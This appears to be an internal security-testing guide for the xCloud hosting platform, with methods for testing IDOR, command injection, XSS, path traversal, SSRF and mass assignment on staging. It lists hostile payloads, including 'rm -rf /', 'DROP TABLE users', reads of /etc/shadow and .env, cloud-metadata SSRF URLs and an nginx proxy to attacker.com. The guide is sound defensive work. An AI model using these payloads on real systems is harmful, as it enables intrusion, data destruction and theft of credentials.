# Security Testing

## Methodology

**Reporting requirement:** For every security test, document the *methodology* — which tool you used (Playwright UI, Tinker, curl, SSH), the exact input or command, the URL or route tested, and the observed response. A developer reading the report should be able to replay your exact test. Don't just write "PASS" or "BLOCKED" — show the evidence trail.

### Security Report Format

For each security check in the report, use this structure:

```markdown
**[Check Name]** (e.g., Input Sanitization)
- **How tested:** Describe the method — "Entered `<script>alert(1)</script>` in the site name field via Playwright UI and submitted the form" or "Ran in Tinker: `(new SafeNginxRegexRule)->passes('rule', '$host')`"
- **URL/Route:** The exact URL, route name, or Tinker command used
- **Input given:** The exact payload, form value, or request body
- **Response observed:** HTTP status code, error message text, UI behavior, or Tinker output
- **Verdict:** PASS / FAIL + why
```

## IDOR Testing (Insecure Direct Object Reference)

### Methodology

1. Log in as **User A** (e.g., paid user on Team X)
2. Find a resource URL that belongs to User A (e.g., `/server/354/sites`)
3. Log in as **User B** (e.g., free user on Team Y — different team)
4. Try to access User A's resource URL as User B
5. Expected: **403 Forbidden** or redirect. If you get 200 with User A's data, that's a **Critical** IDOR bug.

### xCloud Resource Hierarchy

Test IDOR at each level of the hierarchy:
```
User → Team → Server → Site → Resource (SSL, Database, Cron, etc.)
```

A user should only access resources belonging to their current team.

### Common IDOR Targets

| Resource | URL Pattern | What to Test |
|----------|-------------|-------------|
| Server | `/server/{id}/...` | Another team's server |
| Site | `/site/{id}/...` | Another team's site |
| Database | `/site/{id}/database` | Cross-site database access |
| SSL Certificate | `/site/{id}/ssl` | Cross-site SSL access |
| Backups | `/site/{id}/backups` | Cross-site backup access |
| Team settings | `/settings/teams/{id}` | Another user's team |
| Billing | `/billing/...` | Cross-team billing data |

### IDOR Report Table

```markdown
| Resource | URL Tested | User A (Owner) | User B (Attacker) | Expected | Actual |
|----------|-----------|----------------|-------------------|----------|--------|
| Site 841 | /site/841/general | User 21 (Team 32) | User 15 (Team 28) | 403 | 403 |
```

## Frontend/Backend Guard Asymmetry (Defense in Depth)

A common vulnerability pattern: the frontend disables a button or adds a JS guard, but the backend API still accepts the request. An attacker can bypass the UI entirely by calling the API directly.

### Methodology

For **every feature the UI disables, blocks, or hides**:

1. **Identify the frontend guard:** Look for `:disabled`, `v-if`, `v-show`, or JS early returns in the Vue component
2. **Find the corresponding API endpoint:** Check the component's axios/Inertia calls, or trace the route
3. **Call the API directly** using curl with valid authentication, bypassing the UI:
   ```bash
   curl -s -X POST "{staging-url}/api/endpoint" \
     -H "Authorization: Bearer {token}" \
     -H "Accept: application/json" \
     -H "Content-Type: application/json" \
     -d '{"param": "value"}'
   ```
4. **Compare:** If the backend accepts the request when the frontend would block it, document it as a defense-in-depth gap

### Real Example (PR #3693)

PHP 8.5's OPCache toggle was disabled in the UI:
- **Frontend guards:** Switch component `:disabled` prop + JS `toggleOpcache()` early return
- **Backend guard:** `PHPVersionController::toggleOpcache()` had **no version check**
- **Result:** API accepted the request if called directly
- **Severity:** Low (OPCache is built into PHP 8.5 so toggling via ini is harmless, but still a defense-in-depth gap)
- **Recommendation:** Add backend guard for consistency

### Guard Asymmetry Report Table

```markdown
| Feature | Frontend Guard | Backend Guard | API Route | Verdict |
|---------|---------------|---------------|-----------|---------|
| OPCache toggle for PHP 8.5 | Switch disabled + JS early return | None | POST /api/server/{id}/php/opcache | Gap (Low) |
```

## API Testing

If the PR introduces or modifies API endpoints:

### Authentication Testing
```bash
# Test with valid auth
curl -s -H "Authorization: Bearer {token}" -H "Accept: application/json" \
  https://{staging-url}/api/endpoint

# Test without auth (should 401)
curl -s -H "Accept: application/json" https://{staging-url}/api/endpoint

# Test with invalid token (should 401)
curl -s -H "Authorization: Bearer invalid-token" -H "Accept: application/json" \
  https://{staging-url}/api/endpoint
```

### Content Type Testing
```bash
# Test with wrong content type (should 415 or 422)
curl -s -X POST -H "Authorization: Bearer {token}" -H "Content-Type: text/plain" \
  https://{staging-url}/api/endpoint
```

### Pagination Edge Cases
```bash
# Negative page
curl -s -H "Authorization: Bearer {token}" -H "Accept: application/json" \
  "https://{staging-url}/api/endpoint?page=-1"

# Extremely large per_page
curl -s -H "Authorization: Bearer {token}" -H "Accept: application/json" \
  "https://{staging-url}/api/endpoint?per_page=999999"

# Page beyond range
curl -s -H "Authorization: Bearer {token}" -H "Accept: application/json" \
  "https://{staging-url}/api/endpoint?page=99999"
```

### Enterprise API Specifics
- Enterprise API uses Bearer token via Laravel Sanctum + `auth.enterprise` middleware
- Base path: `/api/v0.1/`
- Routes in `routes/xcloud-enterprise-api.php`
- Response format: standardized via `EnterpriseApiResponse` helper

## Authorization Policy Testing

### Checking Policies via Tinker

```php
// Find which policy governs a model
$policy = Gate::getPolicyFor(Server::class);
get_class($policy);  // e.g., App\Policies\ServerPolicy

// Test a specific policy method
$user = User::find($userId);
$server = Server::find($serverId);
(new \App\Policies\ServerPolicy)->view($user, $server);
(new \App\Policies\ServerPolicy)->manage($user, $server);

// Check if user can perform action (includes Gate::before)
Gate::forUser($user)->allows('view', $server);
```

### Gate::before Bypass Concerns

Admin users with `Gate::before` returning `true` bypass all policy checks. This is by design, but verify:
- Enterprise/whitelabel-scoped features should NOT be accessible just because a user is admin
- Team-scoped resources should still respect team boundaries even for admins
- Check: `$user->isAdmin()` — if true, test whether policies are bypassed when they shouldn't be

### Team-Scoped vs Global Policies

xCloud uses team-scoped authorization. Verify:
- `$this->authorize('view', $server)` checks team membership
- `hasTeamPermission($team, 'permission:key')` checks role-based permissions within a team
- Actions on a different team's resources should fail even for privileged users (unless admin Gate::before applies)

## Billing Guard Testing

### Middleware Stack

xCloud uses several billing-related middleware:
- `force.payment` / `ForceToPaymentGateway` — redirects users without a payment method
- `upgrade-plan.required` — blocks features that require a paid plan
- `CheckFreePlan` — checks free plan limitations (site limits, etc.)

### Testing Free Plan UX

1. Log in as a free plan user
2. Navigate to a feature that requires a paid plan
3. Verify: user sees an upgrade prompt (not a 500 error or blank page)
4. Verify: the upgrade prompt has a working link to the billing page

### Verifying Middleware via Tinker

```php
// Check which middleware a route has
$route = app('router')->getRoutes()->getByName('route.name');
$route->middleware();
// Should include 'upgrade-plan.required' for paid features
```

## Input Sanitization & XSS

### Test Payloads

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
'; DROP TABLE users; --
{{ 7*7 }}
${7*7}
```

### Where to Test

- All text input fields (site names, server names, descriptions, notes)
- Search fields
- URL fields (custom domains, webhook URLs)
- Config file content fields (nginx rules, etc.)
- API request bodies

### What to Verify

1. Input is either rejected (validation error) or stored safely (HTML-encoded on output)
2. Check the stored value in the database via Tinker — is it raw or sanitized?
3. Reload the page — does the XSS payload execute or is it rendered as plain text?

## Command Injection / RCE Testing (CRITICAL for xCloud)

xCloud executes shell commands on managed servers. Any user input that reaches a shell command is a potential RCE vector.

### High-Risk Input Points

| Feature | Where input reaches the server | What to test |
|---------|-------------------------------|-------------|
| **Custom Nginx rules** | Written to Nginx config files, then `nginx -t && nginx -s reload` | Inject shell metacharacters in the config text |
| **Cron jobs** | Written to crontab via `crontab -l` + append | Inject `;`, `&&`, `$(...)`, backticks in the cron command |
| **Supervisor config** | Written to `/etc/supervisor/conf.d/` | Inject in the `command=` or `directory=` fields |
| **Server names / site names** | May be interpolated into paths or shell commands | Test with `; rm -rf /`, `$(whoami)`, `` `id` `` |
| **Domain names** | Used in Nginx/OLS config, SSL certificate commands | Test with `example.com; whoami`, backticks, `$()` |
| **Custom PHP settings** | Written to php.ini files | Test with newline injection to add `disable_functions=` overrides |
| **Environment variables** | Written to `.env` files | Test with newline injection: `VALUE=x\nAPP_KEY=injected` |
| **SSH keys** | Appended to `authorized_keys` | Test with extra commands after the key |
| **Firewall rules** | Used in `ufw allow` commands | Test with `; whoami` after port number |

### Test Payloads for Command Injection

```
# Shell metacharacters (test each in every text input that affects server state)
; whoami
&& whoami
|| whoami
$(whoami)
`whoami`
| whoami
\n whoami
%0a whoami

# Path traversal in config paths
../../../etc/passwd
/etc/shadow
../../.env

# Newline injection for config files
legitimate-value\nmalicious-directive

# Nginx-specific RCE payloads
location ~ /evil { proxy_pass http://attacker.com; }
set $evil "'; exec('whoami');'";
```

### How to Test

1. **Via UI:** Enter the payload in the relevant form field (e.g., custom Nginx textarea), submit
2. **Verify server-side:** SSH in and check if the payload was sanitized before being written to config
3. **Check validation:** The backend should reject or sanitize shell metacharacters BEFORE the value reaches any `exec()`, `shell_exec()`, `Process::run()`, or config file write
4. **Check via Tinker:** Search for Process/exec calls in the codebase that use the changed input

### What to Grep in the Codebase

```bash
# Find shell execution points that might use user input
grep -rn "Process::run\|shell_exec\|exec(\|system(\|passthru(" app/ --include="*.php"
# Find where user input is written to config files
grep -rn "file_put_contents\|Storage::put\|fwrite" app/ --include="*.php" | grep -i "config\|nginx\|supervisor\|cron"
```

## Request Parameter Tampering

Different from IDOR (which tests URL access). This tests **modifying hidden form fields or POST body parameters** to affect other users' resources.

### Methodology

1. **Open browser DevTools or use `browser_network_requests`** to capture the form submission
2. **Identify parameters** that reference resource IDs: `server_id`, `site_id`, `team_id`, `user_id`
3. **Replay the request via curl** with a different resource ID that belongs to another team
4. **Check:** Does the backend verify ownership of ALL referenced IDs, or just the URL parameter?

### Common Tampering Targets in xCloud

| Action | Request | Parameter to tamper | Expected |
|--------|---------|-------------------|----------|
| Create site | POST /server/{id}/sites | `server_id` in body (change to another team's server) | 403 |
| Assign domain | POST /site/{id}/domain | `site_id` in body (change to another team's site) | 403 |
| Add SSH key | POST /server/{id}/ssh-keys | `server_id` in body vs URL `{id}` mismatch | 403 or validation error |
| Transfer site | POST /site/{id}/transfer | `target_server_id` (change to another team's server) | 403 |
| Add DB user | POST /server/{id}/database/users | `server_id` mismatch | 403 |
| Custom Nginx | POST /site/{id}/nginx-customization | `site_id` mismatch or `server_id` of wrong team | 403 |

### Intercept & Replay Pattern

```bash
# Step 1: Capture a legitimate request (User A's resource)
curl -s -X POST "{staging-url}/server/354/sites" \
  -H "Cookie: {session_cookie}" \
  -H "X-CSRF-TOKEN: {csrf_token}" \
  -H "Content-Type: application/json" \
  -d '{"name": "test-site", "server_id": 354, "type": "wordpress"}'

# Step 2: Replay with tampered server_id (User B's server)
curl -s -X POST "{staging-url}/server/354/sites" \
  -H "Cookie: {session_cookie}" \
  -H "X-CSRF-TOKEN: {csrf_token}" \
  -H "Content-Type: application/json" \
  -d '{"name": "test-site", "server_id": 999, "type": "wordpress"}'
# Expected: 403 or "server not found" — NOT creating a site on server 999
```

## Privilege Escalation Testing

### Vertical Escalation (Role → Higher Role)

| Test | Method | Expected |
|------|--------|----------|
| Team member → admin actions | Log in as team editor, try admin-only endpoints via curl | 403 |
| Free plan → paid features | Log in as free user, POST to paid feature endpoints directly | Blocked by billing middleware |
| Non-owner → owner actions | Log in as team member, try to delete server/transfer ownership | 403 |
| Regular user → Gate::before bypass | Check if admin check is too broad — test with `$user->isAdmin()` in Tinker | Admin should still respect team boundaries |

### Horizontal Escalation (Same Role, Different Scope)

| Test | Method | Expected |
|------|--------|----------|
| Team A member → Team B resources | Switch teams or manipulate `team_id` parameter | Only access current team's resources |
| Whitelabel A → Whitelabel B data | Test with whitelabel-scoped resources | Strict isolation |

## Path Traversal Testing

### Where to Test

| Feature | Input | Risk |
|---------|-------|------|
| File Manager | File/directory paths | `../../../etc/passwd` |
| Log Viewer | Log file name parameter | `../../.env` |
| Backup download | Backup file name/path | `../../../etc/shadow` |
| Config file paths | PHP/Nginx/MySQL config paths | Escaping the expected directory |
| Site path | Application path in settings | `../../other-site/` |

### Test Payloads

```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
/etc/passwd%00.php
```

## SSRF (Server-Side Request Forgery)

If any feature accepts URLs that the server fetches:

| Feature | Input | SSRF test |
|---------|-------|-----------|
| Webhook URLs | Notification/deploy hooks | `http://169.254.169.254/latest/meta-data/` (cloud metadata) |
| Domain validation | Custom domain DNS check | `http://localhost:6379/` (internal Redis) |
| Git repository URLs | Deploy from Git | `file:///etc/passwd` or `http://internal-service/` |

### What to Check
- Server should not fetch internal IPs (127.0.0.1, 169.254.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x)
- Server should not follow redirects to internal IPs
- DNS rebinding: domain resolves to public IP first, then internal IP on re-resolve

## Mass Assignment Testing (Laravel-Specific)

### Methodology

1. **Find the model** involved in the PR's form submission
2. **Check `$fillable` or `$guarded`** — does it protect sensitive fields?
3. **Submit extra fields** in the POST body that shouldn't be user-writable:

```bash
# Try to set admin-only fields via a regular form submission
curl -s -X PUT "{staging-url}/server/354" \
  -H "Cookie: {session}" \
  -d '{"name": "legit-name", "team_id": 999, "is_admin": true, "plan": "enterprise"}'
```

### Common Dangerous Fields to Inject

- `team_id`, `user_id`, `owner_id` — change ownership
- `plan`, `billing_plan`, `is_trial` — bypass billing
- `is_admin`, `role` — escalate privileges
- `status`, `provisioned` — skip provisioning workflow
- `stack` — change server stack (could break things)

## Session & Authentication Testing

| Test | How | Expected |
|------|-----|----------|
| Session fixation | Copy session cookie, log in as different user, use old cookie | Old session invalidated |
| Token reuse after logout | Log out, replay API requests with old token | 401 Unauthorized |
| Concurrent sessions | Log in from two browsers, log out from one | Other session should still work (or not, depending on policy) |
| Password in response | Check all API responses for password/secret fields | Never present |
| Remember token exposure | Check cookies for sensitive data | Encrypted/httpOnly/secure flags |

## Other Security Checks

### CSRF Protection
- Verify forms include CSRF tokens (Inertia handles this automatically, but verify for any custom forms)
- API endpoints using `web` middleware stack should validate CSRF
- API endpoints using `api` middleware stack are exempt (use token auth instead)

### Sensitive Data Exposure
- API responses should not leak full API keys, passwords, or tokens
- Check API resource classes filter sensitive fields
- Verify: only last 4 digits of API keys shown in UI (`****` + last 4)
- Search API responses for fields like `password`, `secret`, `token`, `api_key`

### Rate Limiting
- If the endpoint handles sensitive operations (login, password reset, API key generation), check for rate limiting
- Send 10+ rapid requests and verify you get 429 responses after the limit

## Security Testing Priority for xCloud

| Priority | Category | Why |
|----------|----------|-----|
| **P0 (Always test)** | Command Injection / RCE | xCloud executes shell commands — any injection is catastrophic |
| **P0 (Always test)** | IDOR + Parameter Tampering | Multi-tenant platform — cross-tenant access is a data breach |
| **P1 (Test if PR touches auth/billing)** | Privilege Escalation | Free→paid bypass or role escalation |
| **P1 (Test if PR has user input)** | XSS + Input Sanitization | User input rendered in UI or written to configs |
| **P2 (Test if PR adds URLs/paths)** | SSRF + Path Traversal | Server fetches URLs or handles file paths |
| **P2 (Test if PR modifies models)** | Mass Assignment | Laravel model without proper `$fillable`/`$guarded` |
| **P3 (Verify exists)** | CSRF, Rate Limiting, Session | Framework-level protections should already be in place |
